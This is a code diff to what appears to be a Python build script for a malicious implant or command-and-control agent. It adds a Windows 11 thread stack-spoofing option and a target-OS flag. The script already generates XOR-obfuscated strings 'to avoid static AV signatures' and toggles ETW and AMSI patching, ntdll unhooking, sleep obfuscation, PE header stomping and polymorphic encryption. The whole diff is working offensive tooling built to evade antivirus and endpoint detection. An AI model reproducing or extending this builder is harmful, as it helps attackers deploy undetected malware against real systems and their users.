@@ -76,6 +76,8 @@ def generate_config_h(
     no_etw: bool = False,
     no_amsi: bool = False,
     no_pe_stomp: bool = False,
+    no_stack_spoof: bool = False,
+    target_os: str = "win10",
     debug: bool = False,
 ):
     """Generate a config.h with XOR-encrypted strings to avoid static AV signatures."""
@@ -164,7 +166,7 @@ def generate_config_h(
 #define CONFIG_PATCH_ETW         {0 if (no_evasion or no_etw) else 1}
 #define CONFIG_UNHOOK_NTDLL      {0 if (no_evasion or no_unhook) else 1}
 #define CONFIG_SLEEP_OBFUSCATE   {0 if no_evasion else 1}
-#define CONFIG_STACK_SPOOF       0
+#define CONFIG_STACK_SPOOF       {1 if (target_os == "win11" and not no_stack_spoof and not no_evasion) else 0}
 #define CONFIG_INDIRECT_SYSCALLS 0
 #define CONFIG_PE_STOMP          {0 if (no_evasion or no_pe_stomp) else 1}
 #define CONFIG_API_HASHING       1
@@ -210,6 +212,8 @@ def build_agent(
     no_etw: bool = False,
     no_amsi: bool = False,
     no_pe_stomp: bool = False,
+    no_stack_spoof: bool = False,
+    target_os: str = "win10",
     debug: bool = False,
     no_crypt: bool = False,
 ) -> Path:
@@ -322,6 +326,8 @@ def build_agent(
         no_etw=no_etw,
         no_amsi=no_amsi,
         no_pe_stomp=no_pe_stomp,
+        no_stack_spoof=no_stack_spoof,
+        target_os=target_os,
         debug=debug,
     )
 
@@ -470,6 +476,10 @@ def parse_args():
                    help="Disable AMSI patching only")
     p.add_argument("--no-pe-stomp", action="store_true",
                    help="Disable PE header stomping only")
+    p.add_argument("--no-stack-spoofing", action="store_true",
+                   help="Disable thread stack spoofing during sleep (even on win11)")
+    p.add_argument("--target-os", choices=["win10", "win11"], default="win10",
+                   help="Target OS version. Stack spoofing only enabled on win11 (default: win10)")
     p.add_argument("--no-crypt", action="store_true",
                    help="Skip polymorphic encryption (output raw agent, useful for debugging)")
     p.add_argument("--debug", action="store_true",
@@ -507,6 +517,8 @@ def main():
             no_etw=args.no_etw,
             no_amsi=args.no_amsi,
             no_pe_stomp=args.no_pe_stomp,
+            no_stack_spoof=args.no_stack_spoofing,
+            target_os=args.target_os,
             debug=args.debug,
             no_crypt=args.no_crypt,
         )
